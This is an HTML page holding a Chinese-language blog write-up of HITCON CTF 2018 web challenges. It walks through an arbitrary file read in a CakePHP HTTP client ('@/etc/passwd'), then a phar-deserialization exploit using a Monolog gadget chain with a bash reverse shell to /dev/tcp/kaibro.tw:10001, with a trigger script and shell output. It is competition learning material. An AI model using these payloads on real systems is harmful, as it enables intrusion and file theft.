@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <title>HITCON CTF 2018 Web | Kaibro&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/earlyaccess/notosanstc.css">
+  <meta name="description" content="前情提要 今年跟Balsn, BambooFox, Kerkeryuan共四隊一起組成BFKinesiS 我主要都看Web的部分，雖然很多賽中都沒做出來，但賽後花了點時間檢討了一下 所以就把檢討內容和心路歷程及中間可能碰到的坑打成這篇  Baby Cake 題目給一個輸入url的地方 送出後，他會發Request去該url，並把Response Body/Header Cache在mycache/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HITCON CTF 2018 Web">
+<meta property="og:url" content="http://blog.kaibro.tw/2018/10/24/HITCON-CTF-2018-Web/index.html">
+<meta property="og:site_name" content="Kaibro&#39;s blog">
+<meta property="og:description" content="前情提要 今年跟Balsn, BambooFox, Kerkeryuan共四隊一起組成BFKinesiS 我主要都看Web的部分，雖然很多賽中都沒做出來，但賽後花了點時間檢討了一下 所以就把檢討內容和心路歷程及中間可能碰到的坑打成這篇  Baby Cake 題目給一個輸入url的地方 送出後，他會發Request去該url，並把Response Body/Header Cache在mycache/">
+<meta property="og:image" content="https://i.imgur.com/axUff6E.png">
+<meta property="og:image" content="https://i.imgur.com/CkQ2rmh.png">
+<meta property="og:image" content="https://i.imgur.com/p0LL6ND.png">
+<meta property="og:image" content="https://i.imgur.com/s33Yde0.png">
+<meta property="og:image" content="https://i.imgur.com/mXenNhd.png">
+<meta property="og:image" content="https://i.imgur.com/NBzQDob.png">
+<meta property="og:image" content="https://i.imgur.com/f7kOk3E.png">
+<meta property="og:image" content="https://i.imgur.com/BRRmxrf.png">
+<meta property="og:image" content="https://i.imgur.com/Whk0KIy.png">
+<meta property="og:image" content="https://i.imgur.com/hVgF92c.png">
+<meta property="og:image" content="https://i.imgur.com/Q946Aqv.png">
+<meta property="og:image" content="https://i.imgur.com/orHuYPD.png">
+<meta property="og:updated_time" content="2018-10-27T04:29:17.043Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HITCON CTF 2018 Web">
+<meta name="twitter:description" content="前情提要 今年跟Balsn, BambooFox, Kerkeryuan共四隊一起組成BFKinesiS 我主要都看Web的部分，雖然很多賽中都沒做出來，但賽後花了點時間檢討了一下 所以就把檢討內容和心路歷程及中間可能碰到的坑打成這篇  Baby Cake 題目給一個輸入url的地方 送出後，他會發Request去該url，並把Response Body/Header Cache在mycache/">
+<meta name="twitter:image" content="https://i.imgur.com/axUff6E.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Kaibro&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="https://i.imgur.com/QWxDDzd.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">KaiBro</a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						
+						<div class="icon-wrap icon-me hide" data-idx="3">
+							<div class="user"></div>
+							<div class="shoulder"></div>
+						</div>
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>Menu</li>
+						<li>Tags</li>
+						
+						
+						<li>About</li>
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主頁</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+							<li><a href="http://cv.kaibro.tw/">關於我</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+								<a class="github" target="_blank" href="https://github.com/w181496" title="github">github</a>
+					        
+								<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+					        
+								<a class="facebook" target="_blank" href="https://www.facebook.com/w181496" title="facebook">facebook</a>
+					        
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/BugBounty/" style="font-size: 10px;">BugBounty</a> <a href="/tags/CTF/" style="font-size: 18.33px;">CTF</a> <a href="/tags/DEFCON/" style="font-size: 10px;">DEFCON</a> <a href="/tags/Linux/" style="font-size: 11.67px;">Linux</a> <a href="/tags/NCU/" style="font-size: 13.33px;">NCU</a> <a href="/tags/NTU/" style="font-size: 11.67px;">NTU</a> <a href="/tags/Pwn/" style="font-size: 15px;">Pwn</a> <a href="/tags/Web/" style="font-size: 16.67px;">Web</a> <a href="/tags/筆記/" style="font-size: 20px;">筆記</a> <a href="/tags/開箱/" style="font-size: 10px;">開箱</a> <a href="/tags/開箱文/" style="font-size: 10px;">開箱文</a>
+					</div>
+				</section>
+				
+				
+				
+
+				
+				
+				<section class="switch-part switch-part3">
+				
+					<div id="js-aboutme">安安，我是Kaibro，目前是112電機所CS組的苦命爆肝菸酒生</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide">KaiBro</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+			
+				<img lazy-src="https://i.imgur.com/QWxDDzd.jpg" class="js-avatar">
+			
+			</div>
+			<hgroup>
+			  <h1 class="header-author">KaiBro</h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主頁</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+					<li><a href="http://cv.kaibro.tw/">關於我</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="https://github.com/w181496" title="github">github</a>
+			        
+						<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+			        
+						<a class="facebook" target="_blank" href="https://www.facebook.com/w181496" title="facebook">facebook</a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+
+      <div class="body-wrap"><article id="post-HITCON-CTF-2018-Web" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/10/24/HITCON-CTF-2018-Web/" class="article-date">
+  	<time datetime="2018-10-24T01:08:58.000Z" itemprop="datePublished">2018-10-24</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      HITCON CTF 2018 Web
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+        
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="u524D_u60C5_u63D0_u8981"><a href="#u524D_u60C5_u63D0_u8981" class="headerlink" title="前情提要"></a>前情提要</h1><p><img src="https://i.imgur.com/axUff6E.png" alt=""></p>
+<p>今年跟Balsn, BambooFox, Kerkeryuan共四隊一起組成BFKinesiS</p>
+<p>我主要都看Web的部分，雖然很多賽中都沒做出來，但賽後花了點時間檢討了一下</p>
+<p>所以就把檢討內容和心路歷程及中間可能碰到的坑打成這篇</p>
+<p><br></p>
+<h1 id="Baby_Cake"><a href="#Baby_Cake" class="headerlink" title="Baby Cake"></a>Baby Cake</h1><p><img src="https://i.imgur.com/CkQ2rmh.png" alt=""></p>
+<p>題目給一個輸入url的地方</p>
+<p>送出後，他會發Request去該url，並把Response Body/Header Cache在<code>mycache/IP/md5(url)/</code>下面</p>
+<p>另外有給Source Code</p>
+<p>稍微看一下，可以發現是用CakePHP寫的</p>
+<a id="more"></a>
+<p>主要邏輯在<code>PagesController</code></p>
+<p>從<code>display()</code>中可以看到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$data = $request-&gt;getQuery(<span class="string">'data'</span>);</div><div class="line">$url  = $request-&gt;getQuery(<span class="string">'url'</span>);</div></pre></td></tr></table></figure>
+<p>輸入有這兩個地方，中間會經過<code>parse_url</code>判斷scheme是否為<code>http</code>或<code>https</code></p>
+<p>並且只允許這幾個HTTP Method: <code>get</code>, <code>post</code>, <code>put</code>, <code>delete</code>, <code>patch</code></p>
+<p>可以注意到，只有<code>get</code> method會去做Cache </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$key = md5($url);</div><div class="line"><span class="keyword">if</span> ($method == <span class="string">'get'</span>) &#123;</div><div class="line">    $response = <span class="keyword">$this</span>-&gt;cache_get($key);</div><div class="line">    <span class="keyword">if</span> (!$response) &#123;</div><div class="line">        $response = <span class="keyword">$this</span>-&gt;httpclient($method, $url, $headers, <span class="keyword">null</span>);</div><div class="line">        <span class="keyword">$this</span>-&gt;cache_set($key, $response);                </div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>比較吸引人的地方是，他在存放Header進Cache時，會經過Serialize:</p>
+<p><code>file_put_contents($cache_dir . &quot;headers.cache&quot;, serialize($response-&gt;headers));</code></p>
+<p>然後在取出Cache時，會Unserialize:</p>
+<p><code>$headers = unserialize($headers);</code></p>
+<p>但仔細跟了一下，會發現沒有可以利用的地方，我們沒辦法完全控制<code>unserialize($headers)</code>的輸入</p>
+<p>所以只能放棄這條路，但看來看去，好像也沒其他地方有洞</p>
+<p>最後跟了一下他的<code>httpclient()</code>，他裡面其實包了<code>Client</code>，也就是<code>Cake\Http\Client</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$http = <span class="keyword">new</span> Client();</div><div class="line"><span class="keyword">return</span> $http-&gt;$method($url, $data, $options);</div></pre></td></tr></table></figure>
+<p>跟進去看一下，可以發現它每個method都有一個function做處理，但基本架構都差不多</p>
+<p>所以先跟<code>get()</code>看看</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url, $data = [], array $options = [])</span></span></div><div class="line">&#123;</div><div class="line">    $options = <span class="keyword">$this</span>-&gt;_mergeOptions($options);</div><div class="line">    $body = <span class="keyword">null</span>;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($data[<span class="string">'_content'</span>])) &#123;</div><div class="line">        $body = $data[<span class="string">'_content'</span>];</div><div class="line">        <span class="keyword">unset</span>($data[<span class="string">'_content'</span>]);</div><div class="line">    &#125;</div><div class="line">    $url = <span class="keyword">$this</span>-&gt;buildUrl($url, $data, $options);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_doRequest(</div><div class="line">        Request::METHOD_GET,</div><div class="line">        $url,</div><div class="line">        $body,</div><div class="line">        $options</div><div class="line">    );</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>裡頭呼叫<code>buildUrl($url, $data, $options)</code>，跟進去可以看到，當options, data為空時，會直接return </p>
+<p>所以對<code>get()</code>來說，這邊不會做啥事情</p>
+<p>繼續看下去，他會呼叫<code>__doRequest(Request::METHOD_GET,$url,$body,$options);</code></p>
+<p>裡頭又呼叫<code>_createRequest($method,$url,$data,$options);</code></p>
+<p>再跟進去看，裡頭先對header做處理，然後呼叫<code>new Request($url, $method, $headers, $data);</code></p>
+<p>繼續往Request.php追</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($url = <span class="string">''</span>, $method = self::METHOD_GET, array $headers = [], $data = null)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">$this</span>-&gt;validateMethod($method);</div><div class="line">    <span class="keyword">$this</span>-&gt;method = $method;</div><div class="line">    <span class="keyword">$this</span>-&gt;uri = <span class="keyword">$this</span>-&gt;createUri($url);</div><div class="line">    $headers += [</div><div class="line">        <span class="string">'Connection'</span> =&gt; <span class="string">'close'</span>,</div><div class="line">        <span class="string">'User-Agent'</span> =&gt; <span class="string">'CakePHP'</span></div><div class="line">    ];</div><div class="line">    <span class="keyword">$this</span>-&gt;addHeaders($headers);</div><div class="line">    <span class="keyword">$this</span>-&gt;body($data);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>這裡會先呼叫<code>validateMethod($method)</code>做一些判斷，但沒啥可利用的地方</p>
+<p>接著呼叫<code>createUri($url)</code>，跟進去會看到<code>return new Uri($uri)</code></p>
+<p>其實這邊後面再跟下去，也沒啥可以利用的地方</p>
+<p>後面在做的事情大概是先<code>parseUri($uri)</code>，然後裡面會<code>parse_url($uri)</code>，接著設定scheme, userInfo, host, port, path, …</p>
+<p>跟完這邊，再往回看，回到剛剛的<code>Request::__construct</code></p>
+<p>裡頭會呼叫<code>$this-&gt;addHeaders($headers)</code>，但一樣沒啥值得利用的地方</p>
+<p>最後會呼叫<code>$this-&gt;body($data)</code></p>
+<p>可以發現當<code>$body ($data)</code>為Array時，會去</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (is_array($body)) &#123;</div><div class="line">    $formData = <span class="keyword">new</span> FormData();</div><div class="line">    $formData-&gt;addMany($body);</div><div class="line">    <span class="keyword">$this</span>-&gt;header(<span class="string">'Content-Type'</span>, $formData-&gt;contentType());</div><div class="line">    $body = (string)$formData;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>跟進<code>addMany()</code>瞧瞧</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">foreach</span> ($data <span class="keyword">as</span> $name =&gt; $value) &#123;</div><div class="line">    <span class="keyword">$this</span>-&gt;add($name, $value);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>裡頭對<code>$data</code>每個元素做<code>add()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">($name, $value = null)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (is_array($value)) &#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;addRecursive($name, $value);</div><div class="line">    &#125; <span class="keyword">elseif</span> (is_resource($value)) &#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;addFile($name, $value);</div><div class="line">    &#125; <span class="keyword">elseif</span> (is_string($value) &amp;&amp; strlen($value) &amp;&amp; $value[<span class="number">0</span>] === <span class="string">'@'</span>) &#123;</div><div class="line">        trigger_error(</div><div class="line">            <span class="string">'Using the @ syntax for file uploads is not safe and is deprecated. '</span> .</div><div class="line">            <span class="string">'Instead you should use file handles.'</span>,</div><div class="line">            E_USER_DEPRECATED</div><div class="line">        );</div><div class="line">        <span class="keyword">$this</span>-&gt;addFile($name, $value);</div><div class="line">    &#125; <span class="keyword">elseif</span> ($name <span class="keyword">instanceof</span> FormDataPart &amp;&amp; $value === <span class="keyword">null</span>) &#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;_hasComplexPart = <span class="keyword">true</span>;</div><div class="line">        <span class="keyword">$this</span>-&gt;_parts[] = $name;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;_parts[] = <span class="keyword">$this</span>-&gt;newPart($name, $value);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>我們可以發現當<code>$value</code>為<code>@</code>開頭的字串時，雖然會trigger_error，但後面會繼續<code>addFile($name, $value)</code></p>
+<p>跟進去</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addFile</span><span class="params">($name, $value)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">$this</span>-&gt;_hasFile = <span class="keyword">true</span>;</div><div class="line"></div><div class="line">    $filename = <span class="keyword">false</span>;</div><div class="line">    $contentType = <span class="string">'application/octet-stream'</span>;</div><div class="line">    <span class="keyword">if</span> (is_resource($value)) &#123;</div><div class="line">        $content = stream_get_contents($value);</div><div class="line">        <span class="keyword">if</span> (stream_is_local($value)) &#123;</div><div class="line">            $finfo = <span class="keyword">new</span> finfo(FILEINFO_MIME);</div><div class="line">            $metadata = stream_get_meta_data($value);</div><div class="line">            $contentType = $finfo-&gt;file($metadata[<span class="string">'uri'</span>]);</div><div class="line">            $filename = basename($metadata[<span class="string">'uri'</span>]);</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $finfo = <span class="keyword">new</span> finfo(FILEINFO_MIME);</div><div class="line">        $value = substr($value, <span class="number">1</span>);</div><div class="line">        $filename = basename($value);</div><div class="line">        $content = file_get_contents($value);</div><div class="line">        $contentType = $finfo-&gt;file($value);</div><div class="line">    &#125;</div><div class="line">    $part = <span class="keyword">$this</span>-&gt;newPart($name, $content);</div><div class="line">    $part-&gt;type($contentType);</div><div class="line">    <span class="keyword">if</span> ($filename) &#123;</div><div class="line">        $part-&gt;filename($filename);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">$this</span>-&gt;add($part);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> $part;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>Bang! 終於找到一點有趣的東西惹</p>
+<p>可以看到他會把<code>$value</code>直接丟進<code>file_get_contents($value)</code></p>
+<p>統整一下，這個<code>$value</code>是從<code>$data</code>陣列來的，而<code>$data</code>是直接從<code>getQuery(&#39;data&#39;)</code>來的!</p>
+<p>繼續往下跟，會發現它把讀出來的內容直接透過<code>fopen</code>送到<code>$url</code>指定的地方</p>
+<p>所以我們到這邊就有一個任意讀檔漏洞!</p>
+<p>Payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line">s = requests.session()</div><div class="line">s.post(<span class="string">'http://13.230.134.135/'</span>, params=&#123;<span class="string">'url'</span>: <span class="string">'http://yourip:yourport'</span>, <span class="string">'data[]'</span>: <span class="string">'@/etc/passwd'</span>&#125;)</div></pre></td></tr></table></figure>
+<p>這邊得感謝隊友發現這個洞，我第一次review時，看完<code>_createUri</code>就剛好沒跟到<code>body()</code>，然後繼續往回跟<code>send()</code></p>
+<p>偏偏<code>send()</code>後面還有非常一長串的calling chain，所以一整晚的時間就這樣沒了…</p>
+<p>全部跟完，還以為沒洞，結果原來是少跟一個function…</p>
+<p>OK</p>
+<p>接下來，可以發現它底下有<code>/read_flag</code>和<code>/flag</code>，沒辦法直接讀出flag</p>
+<p>所以肯定得拿shell</p>
+<p>但靠讀檔翻了一兩個小時，根本沒發現啥可以拿shell的東西</p>
+<p>AWS metadata, ssh key, … 全踹過了</p>
+<p>正當崩潰以為找錯洞時</p>
+<p>我突然一個靈感閃現</p>
+<p>題目給Body.cache，不就等於是讓我們上傳檔案嗎</p>
+<p>然後<code>file_get_contents()</code>參數又可以塞PHP wrapper</p>
+<p>那不就可以用今年最潮的<code>phar://</code>去反序列化嗎!</p>
+<p>眼看離比賽結束已經不到1小時，只好拼拼看惹</p>
+<p>一開始以為要自己構造POP chain，後來隊友發現phpggc有<code>Monolog</code></p>
+<p>而從source code可以看到也用了在漏洞影響範圍內的<code>Monolog</code>!</p>
+<p><code>Monolog/RCE1          1.18 &lt;= 1.23      rce              __destruct</code></p>
+<p>composer.json:</p>
+<p><code>&quot;monolog/monolog&quot;: &quot;^1.23&quot;</code></p>
+<p>讚，立馬clone phpggc下來構造payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">namespace</span> <span class="title">GadgetChain</span>\<span class="title">Monolog</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">RCE1</span> <span class="keyword">extends</span> \<span class="title">PHPGGC</span>\<span class="title">GadgetChain</span>\<span class="title">RCE</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">public</span> $version = <span class="string">'1.18 &lt;= 1.23'</span>;</div><div class="line">    <span class="keyword">public</span> $vector = <span class="string">'__destruct'</span>;</div><div class="line">    <span class="keyword">public</span> $author = <span class="string">'cf'</span>;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">generate</span><span class="params">(array $parameters)</span></span></div><div class="line">    &#123;</div><div class="line">        $code = <span class="string">"bash -c 'bash -i &gt;&amp; /dev/tcp/kaibro.tw/10001 0&gt;&amp;1'"</span>;</div><div class="line"></div><div class="line">        @unlink(<span class="string">'exp.phar'</span>);</div><div class="line">        $p = <span class="keyword">new</span> \Phar(<span class="string">'exp.phar'</span>);</div><div class="line">        $p-&gt;startBuffering();</div><div class="line">        $p-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER();?&gt;"</span>);</div><div class="line">        $p-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</div><div class="line">        $p-&gt;setMetadata(<span class="keyword">new</span> \Monolog\Handler\SyslogUdpHandler(<span class="keyword">new</span> \Monolog\Handler\BufferHandler([<span class="string">'current'</span>, <span class="string">'system'</span>],[$code, <span class="string">'level'</span> =&gt; <span class="keyword">null</span>])));</div><div class="line">        $p-&gt;stopBuffering();</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>跑完會生成exp.phar</p>
+<p>然後傳到我自己的Server: kaibro.tw/exp.phar</p>
+<p>接著透過以下腳本觸發反序列化:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests                                                                                                        </div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"></div><div class="line">m = hashlib.md5()</div><div class="line">ip = <span class="string">'1.2.3.4'</span></div><div class="line"></div><div class="line">r = requests.get(<span class="string">'http://13.230.134.135/?url='</span>+sys.argv[<span class="number">1</span>])</div><div class="line"></div><div class="line">s = requests.session()</div><div class="line">m.update(sys.argv[<span class="number">1</span>])</div><div class="line">pay = <span class="string">"phar:///var/www/html/tmp/cache/mycache/"</span>+ip+<span class="string">"/"</span>+m.hexdigest()+<span class="string">"/body.cache"</span></div><div class="line"><span class="keyword">print</span> pay</div><div class="line">print(s.post(<span class="string">'http://13.230.134.135/'</span>, params=&#123;<span class="string">'url'</span>: <span class="string">'http://kaibro.tw:6666/'</span>, <span class="string">'data[]'</span>: <span class="string">'@'</span>+pay&#125;))</div></pre></td></tr></table></figure>
+<p>即可成功Reverse shell回來</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">www-data@ip-<span class="number">172</span>-<span class="number">31</span>-<span class="number">24</span>-<span class="number">186</span>:/$ ls -<span class="selector-tag">a</span></div><div class="line">ls -<span class="selector-tag">a</span></div><div class="line">.</div><div class="line">..</div><div class="line">bin</div><div class="line">boot</div><div class="line">dev</div><div class="line">etc</div><div class="line">flag</div><div class="line">home</div><div class="line">initrd<span class="selector-class">.img</span></div><div class="line">initrd<span class="selector-class">.img</span><span class="selector-class">.old</span></div><div class="line">lib</div><div class="line">lib64</div><div class="line">lost+found</div><div class="line">media</div><div class="line">mnt</div><div class="line">opt</div><div class="line">proc</div><div class="line">read_flag</div><div class="line">root</div><div class="line">run</div><div class="line">sbin</div><div class="line">snap</div><div class="line">srv</div><div class="line">sys</div><div class="line">tmp</div><div class="line">usr</div><div class="line"><span class="selector-tag">var</span></div><div class="line">vmlinuz</div><div class="line">vmlinuz<span class="selector-class">.old</span></div><div class="line">www</div></pre></td></tr></table></figure>
+<p><code>hitcon{smart_implementation_of_CURLOPT_SAFE_UPLOAD&gt;&lt;}</code></p>
+<p>不過賽中其實沒拿到flag，後來賽後debug才發現payload中的<code>/read_flag</code>忘記加斜線…</p>
+<p>如果當時乖乖reverse shell就好惹QQ</p>
+<p><br></p>
+<h1 id="Oh_My_Raddit__26amp_3B_v2"><a href="#Oh_My_Raddit__26amp_3B_v2" class="headerlink" title="Oh My Raddit &amp; v2"></a>Oh My Raddit &amp; v2</h1><p><img src="https://i.imgur.com/p0LL6ND.png" alt=""></p>
+<p>這題分類是Web+Crypto</p>
+<p>其中第一題的flag是Encryption key</p>
+<p>然後有給提示:</p>
+<p><code>assert ENCRYPTION_KEY.islower()</code></p>
+<p>接著觀察題目</p>
+<p>可以發現，題目大致上都由參數<code>s</code>來決定要做啥行為</p>
+<p>而會帶<code>s</code>參數的地方，可以分成三種:</p>
+<ol>
+<li>文章連結</li>
+<li>下載連結</li>
+<li>顯示文章數 (最上頭那個下拉選單)</li>
+</ol>
+<p>觀察下載連結，可以發現:</p>
+<ol>
+<li>結尾都是<code>3ca92540eb2d0a42</code> (8 bytes)</li>
+<li>開頭都是<code>2e7e305f2da018a2cf8208fa1fefc238</code> (16 bytes)</li>
+</ol>
+<p>並且還發現似乎標題愈長，s就愈長</p>
+<p>然後顯示文章數的地方也可以發現:</p>
+<ol>
+<li><p>total 10: <code>06e77f2958b65ffd3ca92540eb2d0a42</code></p>
+</li>
+<li><p>total 100: <code>06e77f2958b65ffd2c0f7629b9e19627</code></p>
+</li>
+</ol>
+<p>只有後8 bytes不同</p>
+<p>一臉ECB mode樣，且block size很明顯是<code>8</code></p>
+<p>從frequency可以發現<code>3ca92540eb2d0a42</code>出現次數非常高</p>
